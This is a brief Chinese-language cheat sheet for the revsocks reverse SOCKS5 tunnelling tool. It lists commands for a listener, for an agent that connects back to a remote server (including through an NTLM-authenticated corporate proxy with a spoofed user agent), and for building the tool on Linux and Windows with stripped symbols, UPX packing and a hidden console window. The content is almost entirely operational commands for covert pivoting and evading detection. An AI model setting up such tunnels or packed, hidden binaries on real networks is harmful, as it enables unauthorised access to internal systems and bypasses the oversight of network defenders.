	监听服务器并在 1080 端口创建一个 SOCKS 5 代理
	>./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass Password1234
	链接到服务器
	>./revsocks -connect 10.10.10.10:8443 -pass Password1234
	>./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass -useragent "Mozilla 5.0/IE Windows 10"

	在Linux构建
	git clone https://github.com/kost/revsocks
	export GOPATH=~/go
	go get github.com/hashicorp/yamux
	go get github.com/armon/go-socks5
	go get github.com/kost/go-ntlmssp
	go build
	go build -ldflags="-s -w" && upx --brute revsocks

	在Windows构建
	go get github.com/hashicorp/yamux
	go get github.com/armon/go-socks5
	go get github.com/kost/go-ntlmssp
	GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
	go build -ldflags -H=windowsgui
	upx revsocks